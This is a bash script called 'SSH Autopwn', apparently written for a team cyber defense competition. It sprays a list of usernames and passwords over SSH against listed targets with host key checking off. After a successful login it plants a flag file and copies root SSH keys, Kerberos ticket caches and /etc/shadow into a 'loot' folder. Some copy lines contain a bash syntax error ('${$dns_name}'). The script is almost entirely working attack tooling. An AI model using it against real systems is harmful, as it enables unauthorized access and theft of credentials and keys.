#!/bin/bash

# SSH Autopwn

# Ensure sshpass is installed
if ! command -v sshpass &> /dev/null; then
    echo "sshpass not found. Please install it first."
    exit 1
fi

# Set paths
TARGETS_FILE="ssh-targets.txt"
FLAGS_DIR="flags"
LOOT_DIR="loot"
CREDENTIALS_FILE="ssh-credentials.txt"

# Read each line from the target file
while IFS=',' read -r team_info ip_info; do
    # Extract the team number and IP address with port
    team_number=$(echo "$team_info" | grep -oE '[0-9]+')
    ip_address=$(echo "$ip_info" | cut -d':' -f1)
    port=$(echo "$ip_info" | cut -d':' -f2)
    
    # Get the DNS name in the format <host>.team#.isucdc.com
    dns_name=$(dig -x "$ip_address" +short | grep -E "team${team_number}\.isucdc\.com")
    
    if [[ -z "$dns_name" ]]; then
        echo "Could not resolve DNS for $ip_address"
        continue
    fi

    # Construct the paths for the flags
    flag_file="${FLAGS_DIR}/team${team_number}/team${team_number}_${dns_name%-*}-root.flag"
    
    if [[ ! -f "$flag_file" ]]; then
        echo "Flag file $flag_file not found. Skipping."
        continue
    fi
    
    # Loop through each credential in the credentials file
    while IFS=',' read -r username password; do
        echo "Trying to upload flag with user: $username to $dns_name"
        
        # Attempt to SCP the flag to the target server
        sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "$flag_file" "${username}@${ip_address}:/root/"

        if [[ $? -eq 0 ]]; then
            echo "Successfully uploaded $flag_file to $dns_name using $username"
            
            # Attempt to download any .flag files from the /etc/ directory
            echo "Downloading .flag files from $dns_name"
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/*.flag" "${LOOT_DIR}/team${team_number}/${$dns_name}"

            # Try and download root ssh keys
            echo "Downloading any SSH keys"
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/root/.ssh/*" "${LOOT_DIR}/team${team_number}/${$dns_name}"

            # Try and download kerb keys
            echo "Downloading any kerb keys"
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/tmp/krb5cc*" "${LOOT_DIR}/team${team_number}/${$dns_name}"

            # Try and download shadown
            echo "Downloading shadow"
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -P "$port" "${username}@${ip_address}:/etc/shadow*" "${LOOT_DIR}/team${team_number}/${$dns_name}"

            if [[ $? -eq 0 ]]; then
                echo "FOUND FLAGS: Successfully downloaded .flag files from $dns_name using $username"
            else
                echo "FAILED to download .flag files from $dns_name using $username"
            fi
            
            break  # Exit the credential loop after a successful attempt
        else
            echo "Failed to upload $flag_file to $dns_name using $username"
        fi

    done < "$CREDENTIALS_FILE"  # Loop over credentials file

done < "$TARGETS_FILE"

echo "Task completed!"
